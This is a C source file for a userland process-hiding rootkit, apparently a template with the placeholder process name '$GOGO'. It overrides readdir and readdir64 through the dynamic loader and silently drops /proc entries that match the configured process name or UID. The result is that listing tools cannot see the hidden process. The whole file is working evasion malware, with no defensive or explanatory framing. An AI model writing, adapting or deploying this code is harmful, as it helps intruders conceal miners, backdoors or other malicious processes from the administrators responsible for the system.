#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <stdlib.h>

/*
 * Process name to filter
 */
static const char *process_to_filter = "$GOGO";

/*
 * UID to filter (optional, set to -1 to disable)
 */
static const uid_t uid_to_filter = -1;

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR *dirp, char *buf, size_t size)
{
    int fd = dirfd(dirp);
    if (fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name and UID given its PID
 */
static int get_process_info(const char *pid, char *process_name, uid_t *uid)
{
    if (strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/status", pid);

    FILE *f = fopen(tmp, "r");
    if (f == NULL) {
        return 0;
    }

    char line[256];
    int found_name = 0, found_uid = 0;

    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "Name:", 5) == 0) {
            sscanf(line, "Name:\t%255s", process_name);
            found_name = 1;
        } else if (strncmp(line, "Uid:", 4) == 0) {
            sscanf(line, "Uid:\t%u", uid);
            found_uid = 1;
        }

        if (found_name && found_uid) {
            break;
        }
    }

    fclose(f);
    return found_name && found_uid;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent *(*original_##readdir)(DIR *) = NULL;             \
                                                                        \
struct dirent *readdir(DIR *dirp)                                       \
{                                                                       \
    if (original_##readdir == NULL) {                                   \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
        if (original_##readdir == NULL) {                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());       \
            return NULL;                                                \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent *dir;                                                 \
                                                                        \
    while (1) {                                                         \
        dir = original_##readdir(dirp);                                 \
        if (dir) {                                                      \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            uid_t process_uid;                                          \
            if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&       \
                strcmp(dir_name, "/proc") == 0 &&                     \
                get_process_info(dir->d_name, process_name, &process_uid)) { \
                if (strcmp(process_name, process_to_filter) == 0 ||    \
                    (uid_to_filter != -1 && process_uid == uid_to_filter)) { \
                    continue;                                           \
                }                                                       \
            }                                                           \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);